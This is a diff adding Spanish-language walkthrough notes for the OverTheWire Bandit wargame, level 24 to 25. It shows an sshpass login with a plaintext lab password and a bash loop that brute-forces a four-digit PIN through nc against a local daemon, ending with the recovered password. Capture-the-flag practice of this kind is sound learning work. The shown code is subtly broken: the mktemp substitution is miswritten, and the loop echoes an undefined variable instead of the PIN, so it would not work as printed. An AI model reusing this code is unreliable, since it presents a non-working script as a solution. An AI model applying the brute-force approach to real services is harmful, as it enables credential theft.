@@ -538,3 +538,30 @@ $ cp carga.sh /var/spool/bandit24/foo
 VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 
 ```
+
+Recurso para las tareas cron:
+
+https://www.site24x7.com/es/tools/crontab/cron-generator.html
+
+```bash
+#A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+#You do not need to create new connections each time.
+
+sshpass -p "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar" ssh bandit24@bandit.labs.overthewire.org -p 2220
+
+export TERM=xterm
+
+#1. La forma inicial puede ser el ejecutar un comando de bash para que se genere un listado de las combinaciones a utilizar. 
+
+$ tempor=${mktemp -d}
+$ cat $tempor
+$ cd $tempor
+
+$ for pin in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done > bf.txt
+
+# Grep -v = excluir el match
+# Grep -vE = excluir más de un match: grep -vE "first|second"
+$ cat bf.txt | nc localhost 30002 | grep -vE "Wrong*|Please enter"
+
+p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
